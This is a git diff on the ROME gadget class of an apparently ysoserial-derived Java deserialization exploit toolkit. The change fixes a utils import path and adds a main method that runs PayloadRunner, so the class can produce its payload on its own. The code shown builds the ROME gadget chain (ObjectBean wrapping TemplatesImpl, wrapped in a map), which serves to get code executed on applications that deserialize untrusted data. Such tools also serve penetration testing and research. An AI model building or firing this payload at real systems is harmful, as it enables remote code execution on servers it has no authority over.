@@ -3,12 +3,13 @@ package A.R.ysogate.payloads.gadgets;
 
 import javax.xml.transform.Templates;
 
+import A.R.ysogate.payloads.utils.PayloadRunner;
 import com.sun.syndication.feed.impl.ObjectBean;
 
 import A.R.ysogate.payloads.ObjectPayload;
 import A.R.ysogate.payloads.annotation.Authors;
 import A.R.ysogate.payloads.annotation.Dependencies;
-import A.R.ysogate.payloads.util.Gadgets;
+import A.R.ysogate.payloads.utils.Gadgets;
 
 /**
  * TemplatesImpl.getOutputProperties()
@@ -35,5 +36,9 @@ public class ROME implements ObjectPayload<Object> {
 		ObjectBean delegate = new ObjectBean(Templates.class, o);
 		ObjectBean root     = new ObjectBean(ObjectBean.class, delegate);
 		return Gadgets.makeMap(root, root);
+	}
+
+	public static void main ( final String[] args ) throws Exception {
+		PayloadRunner.run(ROME.class, args);
 	}
 }
